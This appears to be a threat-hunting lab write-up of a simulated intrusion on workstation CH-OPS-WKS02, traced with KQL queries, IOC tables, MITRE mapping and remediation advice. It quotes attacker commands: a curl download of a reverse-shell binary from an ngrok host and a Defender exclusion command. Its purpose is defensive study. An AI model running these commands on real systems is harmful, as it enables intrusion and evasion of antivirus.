# CorpHealth — Operations Activity Review 

<img width="5184" height="3456" alt="national-cancer-institute-NFvdKIhxYlU-unsplash" src="https://github.com/user-attachments/assets/edea0893-2866-41c4-b67d-68974f605ba5" />


## Background

Your organization recently completed a phased deployment of an internal 
platform known as **CorpHealth** — a lightweight system monitoring and 
maintenance framework designed to:

- Track endpoint stability and performance
- Run automated post-patch health checks
- Collect system diagnostics during maintenance windows
- Reduce manual workload for operations teams

CorpHealth operates using a mix of scheduled tasks, background services, 
and diagnostic scripts deployed across operational workstations.

To support this, IT provisioned a dedicated operational account. This 
account was granted local administrator privileges on specific systems 
in order to:

- Register scheduled maintenance tasks
- Install and remove system services
- Write diagnostic and configuration data to protected system locations
- Perform controlled cleanup and telemetry operations

It was designed to be used **only through approved automation frameworks**, 
not through interactive sign-ins.

---

## Anomalous Activity

In mid-November, routine monitoring began surfacing unusual activity tied 
to a workstation in the operations environment. At first glance, the 
activity appeared consistent with normal system maintenance tasks: health 
checks, scheduled runs, configuration updates, and inventory synchronization.

However, closer review raised concerns:

- Activity occurred outside normal maintenance windows
- Script execution patterns deviated from approved baselines
- Diagnostic processes were launched manually rather than through automation
- Some actions resembled behaviors often associated with credential 
  compromise or script misuse

Much of this activity was associated with an account that normally runs 
silently in the background.

---

## Affected System

| Field | Value |
|-------|-------|
| Hostname | `CH-OPS-WKS02` |
| Environment | CorpHealth Operational Network |
| Investigation Window | November 12, 2025 — December 15, 2025 |
| Primary Data Sources | Microsoft Defender for Endpoint, Azure LAW |

---

## Attack Overview

### Investigation Timeline

| Phase | Dates | Activity |
|-------|-------|----------|
| Initial Beaconing | Nov 23, 2025 | Maintenance script first beacon attempt |
| Successful C2 | Nov 25 – Nov 30, 2025 | Beacon succeeds, credential pivoting begins |
| Attacker RDP Logon | Nov 23, 2025 03:08 AM | First interactive attacker session |
| Credential Theft | Nov 23, 2025 03:10 AM | `user-pass.txt` accessed |
| Privilege Escalation | Nov 25, 2025 | Token modification, AV exclusion |
| Payload Delivery | Dec 2, 2025 | `revshell.exe` downloaded via curl/ngrok |
| Active Remote Control | Dec 2, 2025 | Attacker interactively connected via reverse shell |

---

## Flags & Findings

### Flag 0 — Device Identification
**Question:** Which workstation generated the unusual telemetry?

**Answer:** `CH-OPS-WKS02`

**Finding:** A single workstation generated a cluster of low-severity events categorized under *"Operational Maintenance Activity (Unclassified)"* during an off-hours window in mid-November. Activity occurred across four event source types — Process, Network, File, and Script — which is statistically unusual for an idle workstation overnight.

**KQL:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-07T20:00:00))
| where hourofday(TimeGenerated) < 6 or hourofday(TimeGenerated) >= 18
| summarize EventCount = count() by DeviceName
| sort by EventCount desc
```

---

### Flag 1 — Unique Maintenance File
**Question:** Which maintenance script was unique to CH-OPS-WKS02?

**Timestamp:** `2025-11-23T03:46:05Z`

**Answer:**
```
powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Corp\Ops\MaintenanceRunner_Distributed.ps1
```

**Finding:** `MaintenanceRunner_Distributed.ps1` was found exclusively on `CH-OPS-WKS02` — not replicated across any other endpoints. Its location in `C:\ProgramData\Corp\Ops\` and use of `-ExecutionPolicy Bypass` are non-standard for approved automation frameworks.

*(No KQL documented — answer identified through cross-device script comparison in DeviceProcessEvents)*

---

### Flag 2 — Outbound Beacon Indicator
**Question:** When did the maintenance script first initiate outbound communication?

**Timestamp:** `2025-11-23T03:46:08Z`

**Answer:** `powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Corp\Ops\MaintenanceRunner_Distributed.ps1`

**Finding:** The script initiated its first outbound connection attempt within 3 seconds of execution, confirming the script was actively beaconing rather than performing diagnostics.

**KQL:**
```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-11-28T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where InitiatingProcessCommandLine contains "MaintenanceRunner"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl
| sort by TimeGenerated asc
```

---

### Flag 3 — Beacon Destination
**Question:** What remote IP and port did CH-OPS-WKS02 attempt to connect to?

**Answer:** `127.0.0.1:8080`

**Finding:** The script first attempted to contact a local listener on `127.0.0.1:8080` — a classic local C2 staging pattern where a listener was expected to be running on the same machine.

**KQL:**
```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-11-28T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where InitiatingProcessCommandLine contains "MaintenanceRunner"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl
| sort by TimeGenerated asc
```

---

### Flag 4 — Successful Beacon Timestamp
**Question:** When did the beacon finally succeed?

**Answer:** `2025-11-30T01:03:17Z`

**Finding:** The beacon failed repeatedly before succeeding. By November 30th the script was running under `analyst.user` with `-WindowStyle Hidden` and `-NoProfile` flags — indicating deliberate stealth modifications.

| Timestamp | Account | Result |
|-----------|---------|--------|
| 2025-11-23 03:46 AM | `ops.maintenance` | `ConnectionFailed` |
| 2025-11-25 04:14 AM | `ops.maintenance` | `ConnectionSuccess` |
| 2025-11-30 12:12 AM | `analyst.user` | `ConnectionSuccess` |
| 2025-11-30 01:03 AM | `analyst.user` | `ConnectionSuccess` ✅ Latest |

**KQL:**
```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-11-30T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where RemoteIP == "127.0.0.1"
| where RemotePort == "8080"
| where ActionType contains "ConnectionSuccess"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl
| sort by TimeGenerated asc
```

---

### Flag 5 — Unexpected Staging Activity
**Question:** What was the full file path of the first primary staging artifact?

**Timestamp:** `2025-11-25T04:15:02Z`

**Answer:** `C:\ProgramData\Microsoft\Diagnostics\CorpHealth\inventory_6ECFD4DF.csv`

**Finding:** The maintenance script created a CSV file in the CorpHealth diagnostics directory immediately after the first successful beacon — staging collected system inventory data for potential exfiltration.

**KQL:**
```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-14T00:00:00) .. datetime(2025-12-1T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where FolderPath contains @"\Diagnostics"
| where ActionType == "FileCreated" 
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessAccountName, FolderPath
| sort by TimeGenerated desc
```

---

### Flag 6 — Staged File Integrity
**Question:** What is the SHA-256 hash of the staged file?

**Timestamp:** `2025-11-25T04:15:02Z`

**Answer:** `7f6393568e414fc564dad6f49a06a161618b50873404503f82c4447d239f12d8`

**KQL:**
```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-14T00:00:00) .. datetime(2025-12-1T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where FolderPath contains @"\Diagnostics"
| where ActionType == "FileCreated" 
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessAccountName, FolderPath, SHA256
| sort by TimeGenerated desc
```

---

### Flag 7 — Duplicate Staged Artifact
**Question:** What is the full path of the second staging artifact?

**Timestamp:** `2025-11-25T04:15:02Z`

**Answer:** `C:\Users\ops.maintenance\AppData\Local\Temp\CorpHealth\inventory_tmp_6ECFD4DF.csv`

**Finding:** A second near-identical file with a different SHA-256 hash was found in the `ops.maintenance` user temp directory — consistent with an attacker working copy or alternate staging location.

**KQL:**
```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-14T00:00:00) .. datetime(2025-12-1T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where FileName contains "inventory"
| where ActionType == "FileCreated"
| project TimeGenerated, FileName, FolderPath, SHA256, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

---

### Flag 8 — Suspicious Registry Activity
**Question:** Which registry key was created during the credential harvesting simulation?

**Timestamp:** `2025-11-25T04:14:40Z`

**Answer:** `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\EventLog\Application\CorpHealthAgent`

**Finding:** The maintenance script registered `CorpHealthAgent` as an application event log source — blending malicious activity into legitimate Windows event logs.

**KQL:**
```kql
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-20T00:00:00) .. datetime(2025-12-1T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where ActionType == "RegistryKeyCreated"
| where InitiatingProcessAccountName != "network service"
| where InitiatingProcessAccountName != "system"
| where InitiatingProcessFileName != "onedrivesetup.exe"
| project TimeGenerated, InitiatingProcessAccountName, InitiatingProcessCommandLine, RegistryKey
```

---

### Flag 9 — Scheduled Task Persistence
**Question:** Which unauthorized scheduled task was created?

**Timestamp:** `2025-11-25T04:15:26Z`

**Answer:** `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\CorpHealth_A65E64`

**Finding:** A scheduled task named `CorpHealth_A65E64` was created one minute after the first successful beacon — named to blend in with legitimate CorpHealth tasks using a random hex suffix.

**KQL:**
```kql
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-15T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where ActionType == "RegistryValueSet"
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

---

### Flag 10 — Registry-Based Persistence
**Question:** What registry value name was added to the Run key?

**Timestamp:** `2025-11-25T04:24:48Z`

**Registry Key:** `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

**Answer:** `MaintenanceRunner`

**Finding:** An ephemeral Run key was created pointing to the maintenance script, then deleted shortly after — designed to survive a single reboot, trigger once, and erase its tracks.

**KQL:**
```kql
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-15T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where ActionType in ("RegistryKeyCreated", "RegistryValueSet", "RegistryKeyDeleted")
| where RegistryKey contains "CurrentVersion\\Run"
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

---

### Flag 11 — Privilege Escalation Event Timestamp
**Question:** When did the first ConfigAdjust privilege escalation event occur?

**Timestamp:** `2025-11-23T03:47:21Z`

**Initiating Process:** `powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Corp\Ops\MaintenanceRunner_Distributed.ps1`

**KQL:**
```kql
DeviceEvents
| where TimeGenerated between (datetime(2025-11-15T00:00:00) .. datetime(2025-11-26T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where AdditionalFields contains "ConfigAdjust"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, AdditionalFields, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

---

### Flag 12 — AV Exclusion Attempt
**Question:** What folder did the attacker attempt to add as a Windows Defender exclusion?

**Timestamp:** `2025-11-23T03:46:37Z`

**Answer:** `C:\ProgramData\Corp\Ops\staging`

**Command:**
```
"cmd.exe" /c echo powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath C:\ProgramData\Corp\Ops\staging -Force > ".cli"
```

**Finding:** The attacker excluded the staging folder from Defender real-time scanning — confirming awareness of AV and intent to operate within a blind spot.

**KQL:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-26T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where FileName has_any ("powershell.exe", "cmd.exe") 
| where ProcessCommandLine has_any ("Add-MpPreference", "Set-MpPreference")
| project TimeGenerated, ProcessCommandLine
```

---

### Flag 13 — PowerShell Encoded Command
**Question:** What decoded PowerShell command was executed?

**Timestamp:** `2025-11-23T03:46:25Z`

**Encoded:**
```
VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAbwBrAGUAbgAtADYARAA1AEUANABFAEUAMAA4ADIAMgA3ACcA
```

**Decoded:**
```powershell
Write-Output 'token-6D5E4EE08227'
```

**Finding:** A Base64 UTF-16LE encoded command was used to output a token string — likely a session ID or C2 handshake marker, deliberately obfuscated to evade basic log inspection.

**KQL:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-11-28T20:00:00))
| where hourofday(TimeGenerated) < 6 or hourofday(TimeGenerated) >= 18
| where DeviceName contains "CH-OPS-WKS02"
| where InitiatingProcessCommandLine contains "powershell.exe"
| where AccountName != "system" 
| where AccountName != "local service" 
| extend Enc = extract(@"-EncodedCommand\s+([A-Za-z0-9+/=]+)", 1, ProcessCommandLine)
| extend Decoded = base64_decode_tostring(Enc)
| sort by TimeGenerated asc 
| project TimeGenerated, AccountName, FolderPath, InitiatingProcessCommandLine, Decoded
```

---

### Flag 14 — Privilege Token Modification
**Question:** What was the InitiatingProcessId of the process whose token was modified?

**Timestamp:** `2025-11-25T04:14:07Z`

**Answer:** `4888`

**Finding:** A `ProcessPrimaryTokenModified` event was recorded — the attacker elevated token integrity to High, consistent with a privilege escalation attempt.

**KQL:**
```kql
DeviceEvents
| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-26T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where AdditionalFields has_any ("tokenChangeDescription", "Privileges were added")
| where InitiatingProcessCommandLine contains "MaintenanceRunner_Distributed.ps1"
| sort by TimeGenerated asc 
```

---

### Flag 15 — Token Owner SID
**Question:** Which SID did the modified token belong to?

**Answer:** `S-1-5-21-1605642021-30596605-784192815-1000`

**Finding:** The `-1000` suffix identifies this as the first local user account — the primary local account whose privileges were targeted for escalation.

**KQL:**
```kql
DeviceEvents
| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-26T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where AdditionalFields has_any ("tokenChangeDescription", "Privileges were added")
| where InitiatingProcessCommandLine contains "MaintenanceRunner_Distributed.ps1"
| sort by TimeGenerated asc 
```

---

### Flag 16 — Ingress Tool Transfer
**Question:** What executable was written to disk after the outbound request?

**Curl Event Timestamp:** `2025-12-02T12:56:54Z`

**Answer:** `revshell.exe`

**Command:**
```
"curl.exe" -o revshell.exe https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe
```

**KQL:**
```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-12-02T00:00:00) .. datetime(2025-12-03T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where ActionType == "FileCreated" 
| where FileName endswith ".exe"
| project TimeGenerated, ActionType, FileName, InitiatingProcessCommandLine, InitiatingProcessAccountName, FolderPath
```

---

### Flag 17 — External Download Source
**Question:** What URL was used to retrieve the file?

**Answer:** `https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe`

**External IP:** `3.22.30.40:443`

**Finding:** The attacker used an ngrok dynamic tunnel to host and deliver the reverse shell binary — a common technique to evade static domain blocklists.

**KQL:**
```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-12-02T00:00:00) .. datetime(2025-12-03T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where InitiatingProcessFileName contains "curl"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
| sort by TimeGenerated asc
```

---

### Flag 18 — Execution of Staged Binary
**Question:** Which process executed `revshell.exe`?

**Timestamp:** `2025-12-02T12:30:03Z`

**Answer:** `explorer.exe`

**Drop Location:** `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\revshell.exe`

**Finding:** The binary was executed interactively via `explorer.exe` — mimicking typical user behavior. The drop location in the Startup folder confirmed simultaneous persistence establishment.

**KQL:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-02T00:00:00) .. datetime(2025-12-04T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where FolderPath contains @"start menu"
| sort by TimeGenerated desc 
```

---

### Flag 19 — External IP Contacted by Executable
**Question:** What external IP did `revshell.exe` attempt to connect to?

**Answer:** `13.228.171.119:11746`

**Finding:** The reverse shell made outbound TCP connection attempts to an external C2 endpoint on a non-standard high port — consistent with reverse shell callback behavior.

**KQL:**
```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-12-02T00:00:00) .. datetime(2025-12-04T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where InitiatingProcessCommandLine contains "revshell.exe" 
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RemotePort, RemoteIP
```

---

### Flag 20 — Startup Folder Persistence
**Question:** Which folder path did the attacker use for persistence?

**Answer:** `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\`

**Finding:** Placing `revshell.exe` in the All Users Startup folder ensured automatic execution on every user logon (MITRE T1547.001).

**KQL:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-02T00:00:00) .. datetime(2025-12-04T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where FolderPath contains @"start menu"
| sort by TimeGenerated desc 
```

---

### Flag 21 — Remote Session Source Device
**Question:** What device name was the remote session origin?

**Answer:** `对手` *(Chinese for "adversary/opponent")*

**Finding:** The attacker's machine was named `对手` — appearing consistently in `ProcessRemoteSessionDeviceName` across all suspicious events on `CH-OPS-WKS02`.

**KQL:**
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-20T00:00:00) .. datetime(2025-12-04T20:00:00))
| where DeviceName contains "CH-OPS-WKS02" 
| where RemoteDeviceName != ""
| sort by TimeGenerated desc 
| project TimeGenerated, AccountName, ActionType, FailureReason, RemoteDeviceName, InitiatingProcessRemoteSessionDeviceName
```

---

### Flag 22 — Remote Session IP Address
**Question:** What IP address was the source of the remote session?

**Answer:** `100.64.100.6`

**Timestamp:** `2025-11-23T03:08:44Z`

**Finding:** RFC 6598 address space (`100.64.x.x`) used by Azure for internal NAT — representing the entry point into the Azure environment.

**KQL:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-15T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where isnotempty(InitiatingProcessRemoteSessionIP)
| distinct InitiatingProcessRemoteSessionIP, ProcessRemoteSessionIP
```

---

### Flag 23 — Internal Pivot Host
**Question:** Which internal IP was the attacker's pivot host?

**Answer:** `10.168.0.6`

**Finding:** A separate internal VM on the `10.168.x.x` subnet — named `对手` — was used as a staging point to laterally reach `CH-OPS-WKS02`.

**Attack Route:**
```
Internet → 100.64.100.6 (Azure NAT Entry) → 10.168.0.6 "对手" (Pivot VM) → CH-OPS-WKS02 (Target)
```

**KQL:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-15T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where isnotempty(InitiatingProcessRemoteSessionIP)
| distinct InitiatingProcessRemoteSessionIP, ProcessRemoteSessionIP
```

---

### Flag 24 — First Suspicious Logon Timestamp
**Question:** When did the attacker first successfully log on?

**Answer:** `2025-11-23T03:08:31Z`

**KQL:**
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-15T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where RemoteDeviceName contains "对手"
| where ActionType contains "LogonSuccess"
```

---

### Flag 25 — IP Address at First Logon
**Question:** What IP was associated with the first suspicious logon?

**Answer:** `104.164.168.17`

**KQL:**
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-15T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where RemoteDeviceName contains "对手"
| where ActionType contains "LogonSuccess"
```

---

### Flag 26 — Account Used at First Logon
**Question:** Which account did the attacker use to log in?

**Answer:** `chadmin`

**KQL:**
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-15T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where RemoteDeviceName contains "对手"
```

---

### Flag 27 — Attacker Geographic Region
**Question:** What country do the attacker's IPs originate from?

**Answer:** `Vietnam`

**KQL:**
```kql
print geo_info_from_ip_address("104.164.168.17")

DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-15T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where RemoteDeviceName contains "对手"
| where ActionType contains "LogonSuccess"
```

---

### Flag 28 — First Process After Logon
**Question:** What was the first process launched after the attacker logged in?

**Timestamp:** `2025-11-23T03:08:52Z`

**Answer:** `explorer.exe`

**Finding:** `explorer.exe` was the first process launched under `chadmin` via the RDP session — establishing the interactive desktop shell used for subsequent activity.

**KQL:**
```kql
DeviceProcessEvents
| where TimeGenerated > datetime(2025-11-23T03:08:31Z)
| where TimeGenerated < datetime(2025-11-23T03:15:00Z)
| where DeviceName contains "CH-OPS-WKS02"
| where InitiatingProcessAccountName == "chadmin"
| where InitiatingProcessFileName == "explorer.exe"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName, ProcessId
| sort by TimeGenerated asc
| take 1
```

---

### Flag 29 — First File Accessed
**Question:** What file did the attacker open first?

**Timestamp:** `2025-11-23T03:10:57Z`

**Answer:** `user-pass.txt`

**Finding:** Within two minutes of establishing the desktop session, the attacker opened a plaintext credential file — confirming targeted credential harvesting as an immediate priority.

**KQL:**
```kql
DeviceFileEvents
| where TimeGenerated > datetime(2025-11-23T03:09:00Z)
| where TimeGenerated < datetime(2025-11-23T03:20:00Z)
| where DeviceName contains "CH-OPS-WKS02"
| where InitiatingProcessAccountName == "chadmin"
| where InitiatingProcessFileName != "onedrivesetup.exe" 
| project TimeGenerated, FileName, FolderPath, ActionType, InitiatingProcessFileName
| sort by TimeGenerated asc
```

---

### Flag 30 — Attacker's Next Action
**Question:** What did the attacker do after reading the credential file?

**Timestamp:** `2025-11-23T03:11:45Z`

**Answer:** `ipconfig.exe` (network reconnaissance)

**Finding:** Immediately after reading `user-pass.txt`, the attacker launched `ipconfig.exe` via PowerShell — beginning network reconnaissance with newly stolen credentials.

**KQL:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23T00:00:00) .. datetime(2025-11-23T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where InitiatingProcessCommandLine contains "powershell.exe"
| where InitiatingProcessRemoteSessionDeviceName contains "对手"
```

---

### Flag 31 — Next Account Accessed After Recon
**Question:** Which account did the attacker access after initial enumeration?

**Timestamp:** `2025-11-23T03:30:27Z`

**Answer:** `ops.maintenance` — `LogonSuccess`

**Finding:** Using credentials harvested from `user-pass.txt`, the attacker successfully authenticated as `ops.maintenance` — the privileged service account — approximately 20 minutes after reading the credential file.

**KQL:**
```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-15T20:00:00))
| where DeviceName contains "CH-OPS-WKS02"
| where AccountName contains "ops.maintenance"
| where RemoteDeviceName contains "对手"
| where ActionType contains "LogonSuccess"
```

---

## Complete Attack Chain

```
[INTERNET / VIETNAM]
        │
        │ Via ngrok tunnel & public IP 104.164.168.17
        ▼
┌─────────────────────┐
│  対手 (Pivot VM)     │  10.168.0.6 / 100.64.100.6
│  "Adversary"        │
└────────┬────────────┘
         │ RDP → chadmin
         ▼
┌─────────────────────────────────────────────────────┐
│                  CH-OPS-WKS02                        │
│                                                      │
│  Nov 23 03:08  → RDP Logon as chadmin               │
│  Nov 23 03:10  → Read user-pass.txt                 │
│  Nov 23 03:11  → Network recon (ipconfig, net.exe)  │
│  Nov 23 03:30  → Logon as ops.maintenance           │
│  Nov 23 03:46  → MaintenanceRunner_Distributed.ps1  │
│  Nov 23 03:46  → AV Exclusion — staging folder      │
│  Nov 23 03:46  → Encoded PS token beacon            │
│  Nov 25 04:14  → First successful beacon 127.0.0.1  │
│  Nov 25 04:15  → Staging: inventory_6ECFD4DF.csv    │
│  Nov 25 04:15  → Scheduled Task: CorpHealth_A65E64  │
│  Nov 25 04:24  → Run Key: MaintenanceRunner          │
│  Nov 30 01:03  → Final successful beacon            │
│  Dec 02 12:56  → curl downloads revshell.exe        │
│  Dec 02 12:30  → revshell.exe executed              │
│  Dec 02        → Startup folder persistence         │
│  Dec 02        → C2 callback 13.228.171.119:11746   │
└─────────────────────────────────────────────────────┘
```

---

## Indicators of Compromise (IOCs)

### Files
| Filename | Path | Description |
|----------|------|-------------|
| `MaintenanceRunner_Distributed.ps1` | `C:\ProgramData\Corp\Ops\` | Unique beacon script |
| `inventory_6ECFD4DF.csv` | `C:\ProgramData\Microsoft\Diagnostics\CorpHealth\` | Primary staging artifact |
| `inventory_tmp_6ECFD4DF.csv` | `C:\Users\ops.maintenance\AppData\Local\Temp\CorpHealth\` | Duplicate staging artifact |
| `revshell.exe` | `C:\Users\chadmin\` | Reverse shell binary |
| `revshell.exe` | `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\` | Persistence copy |
| `user-pass.txt` | `CH-OPS-WKS02` | Plaintext credential file accessed by attacker |
| `portscan.ps1` | `C:\ProgramData\` | Internal network scanner downloaded from GitHub |
| `exfiltratedata.ps1` | `C:\ProgramData\` | Data exfiltration script |

### Network
| Indicator | Type | Description |
|-----------|------|-------------|
| `127.0.0.1:8080` | IP:Port | Local C2 listener beacon destination |
| `13.228.171.119:11746` | IP:Port | External reverse shell C2 |
| `3.22.30.40:443` | IP:Port | ngrok tunnel delivery server |
| `unresuscitating-donnette-smothery.ngrok-free.dev` | Domain | ngrok payload hosting domain |
| `104.164.168.17` | IP | Attacker public IP (Vietnam) |
| `100.64.100.6` | IP | Azure NAT entry point |
| `10.168.0.6` | IP | Internal pivot VM (`对手`) |

### Registry
| Key | Description |
|-----|-------------|
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MaintenanceRunner` | Ephemeral persistence Run key |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\CorpHealth_A65E64` | Unauthorized scheduled task |
| `HKLM\SYSTEM\ControlSet001\Services\EventLog\Application\CorpHealthAgent` | Fake event log source registration |

### Hashes
| File | SHA-256 |
|------|---------|
| `inventory_6ECFD4DF.csv` | `7f6393568e414fc564dad6f49a06a161618b50873404503f82c4447d239f12d8` |

### Accounts Compromised
| Account | How |
|---------|-----|
| `chadmin` | Used for initial RDP logon |
| `ops.maintenance` | Credentials stolen from `user-pass.txt` |
| `analyst.user` | Used in later beacon activity |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Observed |
|-------------|------|----------|
| T1059.001 | PowerShell | `MaintenanceRunner_Distributed.ps1`, encoded commands |
| T1027 | Obfuscated Files or Information | Base64 encoded PowerShell commands |
| T1071.001 | Application Layer Protocol: Web | Beaconing over HTTP port 8080 |
| T1572 | Protocol Tunneling | ngrok tunnel for payload delivery |
| T1105 | Ingress Tool Transfer | `curl.exe` downloading `revshell.exe` |
| T1547.001 | Startup Folder Persistence | `revshell.exe` in All Users Startup |
| T1053.005 | Scheduled Task | `CorpHealth_A65E64` |
| T1112 | Modify Registry | Run key `MaintenanceRunner` |
| T1562.001 | Disable or Modify Tools | Defender exclusion on staging folder |
| T1078 | Valid Accounts | `chadmin`, `ops.maintenance`, `analyst.user` |
| T1552.001 | Credentials In Files | `user-pass.txt` plaintext credential file |
| T1021.001 | Remote Services: RDP | Attacker RDP from pivot VM `对手` |
| T1134 | Access Token Manipulation | ProcessPrimaryTokenModified event |
| T1083 | File and Directory Discovery | `ipconfig.exe`, `net.exe` post-logon recon |

---

## Vulnerabilities Identified

| ID | Severity | Finding |
|----|----------|---------|
| CH-V001 | CRITICAL | Plaintext credentials stored in `user-pass.txt` |
| CH-V002 | CRITICAL | Privileged service account (`ops.maintenance`) accessible via credential file |
| CH-V003 | CRITICAL | No MFA on administrative accounts (`chadmin`) |
| CH-V004 | HIGH | Defender exclusions configurable without additional authorization |
| CH-V005 | HIGH | Internal VM (`対手` at `10.168.0.6`) compromised and used as pivot — undetected |
| CH-V006 | HIGH | PowerShell execution policy bypassable via `-ExecutionPolicy Bypass` |
| CH-V007 | MEDIUM | Startup folder writable by non-admin accounts |
| CH-V008 | MEDIUM | No alerting on off-hours RDP sessions |

---

## Recommendations

### Immediate Actions
1. **Isolate CH-OPS-WKS02** from the network pending full forensic review
2. **Reset all compromised account credentials** — `chadmin`, `ops.maintenance`, `analyst.user`
3. **Investigate `10.168.0.6`** (`対手`) as a separately compromised host
4. **Block IOCs** at network perimeter — ngrok domain, external IPs
5. **Remove persistence mechanisms** — Run key, Scheduled Task, Startup folder entry

### Short-Term Remediation
1. **Delete all plaintext credential files** — enforce password manager policy
2. **Enforce MFA** on all administrative and service accounts
3. **Restrict PowerShell** execution policy via GPO
4. **Alert on off-hours RDP** sessions to operational workstations
5. **Audit Defender exclusions** — require change management approval

### Long-Term Security Improvements
| Priority | Recommendation |
|----------|----------------|
| Critical | Implement Privileged Access Management (PAM) for service accounts |
| Critical | Enforce MFA across all accounts |
| High | Deploy network segmentation between operational and corporate networks |
| High | Implement Just-In-Time (JIT) access for administrative accounts |
| High | Block outbound ngrok and dynamic tunnel domains at firewall |
| Medium | Implement PowerShell script block logging and AMSI |
| Medium | Regular threat hunting exercises on operational endpoints |
| Medium | Security awareness training for credential hygiene |

---

## Investigation Statistics

| Metric | Value |
